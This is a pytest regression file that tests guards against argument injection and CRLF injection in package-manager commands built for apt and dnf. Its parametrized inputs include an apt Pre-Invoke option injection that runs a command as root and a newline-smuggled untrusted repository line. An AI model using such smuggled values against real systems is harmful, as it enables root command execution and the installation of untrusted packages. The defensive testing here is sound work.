"""Regression tests: package-name / repo-URL option & CRLF injection guards.

These lock in the fix for the argument-injection finding where a package field like
`nginx -o DPkg::Pre-Invoke::=<cmd>` would be parsed by apt/dnf as an OPTION (arbitrary
root command execution, invisible to the command-policy deny-list), and the apt
sources.list CRLF injection via an unchecked repository URL.
"""
import pytest

import client._api_automation as a
import client._api_repo as r


@pytest.mark.parametrize("field", [
    "nginx -o DPkg::Pre-Invoke::=touch${IFS}/tmp/pwned",
    "-o Foo",
    "--installroot=/",
    "nginx -y --allow-downgrades",
])
def test_leading_dash_package_token_rejected(field):
    for fn in (a.cmd_install_packages, a.cmd_remove_packages, a.cmd_update_packages):
        with pytest.raises(ValueError):
            fn(field)


@pytest.mark.parametrize("fn", [
    a.cmd_install_packages, a.cmd_remove_packages, a.cmd_update_packages,
])
def test_end_of_options_separator_present(fn):
    # A `--` terminator precedes the package operands, so even a token that slipped
    # the charset check could not be parsed as an option.
    assert " -- " in fn("nginx")


def test_legit_names_and_versions_still_work():
    assert " -- nginx curl vim" in a.cmd_install_packages("nginx curl vim")
    assert "nginx=1.2.3" in a.cmd_install_packages("nginx=1.2.3")   # version spec ok


@pytest.mark.parametrize("bad_url", [
    "http://ok.example/deb\ndeb [trusted=yes] http://evil/apt stable main",
    "http://ok\r\ndeb x",
])
def test_repo_url_crlf_rejected(bad_url):
    with pytest.raises(ValueError):
        r.cmd_add_repository(bad_url, "myrepo")


def test_repo_url_single_line_ok():
    assert "sources.list.d/myrepo.list" in r.cmd_add_repository("http://ok.example/deb", "myrepo")
